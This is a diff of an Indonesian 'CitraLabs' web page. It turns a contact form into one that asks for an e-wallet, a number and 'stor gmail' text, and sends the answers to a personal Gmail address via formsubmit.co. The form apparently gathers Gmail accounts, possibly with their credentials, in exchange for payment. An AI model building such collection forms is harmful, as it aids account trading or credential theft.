@@ -64,15 +64,15 @@
   <h1>CitraLabs</h1>
   <p>Kirim pesan kepada kami</p>
 
-  <form action="https://formsubmit.co/EMAILKAMU@gmail.com" method="POST">
+  <form action="https://formsubmit.co/caroluscitra08@gmail.com" method="POST">
 
-    <input type="text" name="nama" placeholder="Nama kamu" required>
+    <input type="text" name="e-wallet" placeholder="e-wallet"required>
 
-    <input type="email" name="email" placeholder="Email kamu" required>
+    <input type="nomor" name="nomor" placeholder="nomor" required>
 
-    <textarea name="pesan" placeholder="Tulis pesan..." required></textarea>
+    <textarea name="stor" placeholder="storgmail.." required></textarea>
 
-    <button type="submit">Kirim Pesan</button>
+    <button type="submit">stor gmail</button>
 
   </form>
 </div>
